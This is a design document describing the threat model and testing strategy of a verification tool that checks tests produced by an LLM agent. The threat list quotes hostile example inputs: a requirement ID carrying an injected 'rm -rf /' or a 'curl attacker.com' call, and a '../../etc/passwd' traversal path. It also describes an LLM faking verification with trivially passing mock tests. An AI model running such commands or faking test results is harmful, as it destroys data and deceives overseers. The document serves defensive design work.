# Project Ghost Protocol — Security Model & Testing Strategy

> **Architectural Doctrine**: Verification tools are prime targets for evasion and privilege escalation. A verification tool that can be subverted or tricked by an LLM is worse than useless.

---

## 1. Threat Analysis & Countermeasures

### Threat 1: Command Injection via Malicious Requirement IDs or Test Targets
- **Attack Vector**: An agent or user submits `PAYMENT-001; rm -rf /` or `PAYMENT-001 && curl attacker.com`.
- **Countermeasure**:
  - Strict regex validation on all requirement IDs: `^[A-Z0-9]+-[A-Z0-9]+$`.
  - Zero execution of user-submitted shell strings. Command arrays are constructed internally using `[sys.executable, "-m", "pytest", <whitelisted_target>]`.
  - Subprocess execution uses `shell=False` exclusively.

### Threat 2: Path Traversal in Evidence and Artifact Paths
- **Attack Vector**: Requesting evidence files or storing logs using `../../../../etc/passwd`.
- **Countermeasure**:
  - Canonicalization using `Path.resolve()`.
  - Confinement assertion: `assert str(target.resolve()).startswith(str(base_dir.resolve()))`.

### Threat 3: Environment Credential Leakage
- **Attack Vector**: Subprocesses inherit host environment variables containing AWS keys, GitHub tokens, or local credentials and leak them into test output.
- **Countermeasure**:
  - Filtered environment dictionary in runner: only pass essential runtime variables (`PATH`, `SYSTEMROOT`, `PYTHONPATH`, `TEMP`).
  - Redaction of known token patterns in captured `stdout` and `stderr`.

### Threat 4: Execution Denial of Service (Infinite Loops, Fork Bombs)
- **Attack Vector**: Agent generates malicious test that sleeps indefinitely or spawns endless threads.
- **Countermeasure**:
  - Hard subprocess timeout (30 seconds default).
  - Explicit process tree termination on timeout expiry.
  - Exit status mapped strictly to `BLOCKED`.

### Threat 5: AI Sycophancy / False Claims ("Fake Verification")
- **Attack Vector**: LLM generates mock test that passes trivially without executing actual domain code.
- **Countermeasure**:
  - Code fingerprinting: Target domain code and test files are hashed (SHA-256).
  - Adversarial verification: Test suites must include deliberate adversarial negative cases (e.g. ₹15,000 overdraft test).
  - Exit code binding: Test status requires actual operating system exit code 0; prose claims are ignored.

---

## 2. Testing Strategy

Ghost Protocol employs a 4-tier testing hierarchy:

1. **Unit Tests**:
   - Isolated verification of domain models, validators, state transitions, and exception hierarchies.
2. **Adversarial Security Tests**:
   - Tests simulating attacks against boundary conditions, overdraft limits, zero/negative inputs, and identity collisions.
3. **Property-Based Invariant Tests**:
   - Verification of fundamental mathematical invariants across randomized domains:
     - **Non-Negativity Invariant**: $\forall a \in \text{Accounts}: a.\text{balance} \ge 0$.
     - **Conservation of Value Invariant**: $\forall t = (s, r, \text{amt}): \Delta \text{balance}_s + \Delta \text{balance}_r = 0$.
     - **Idempotency of Rejection**: Failed transfer attempts leave both accounts strictly identical to pre-transfer state.
4. **Integration & API Contract Tests**:
   - Verification of FastAPI endpoints, SQLite relational transactions, and subprocess runner exit status mapping.
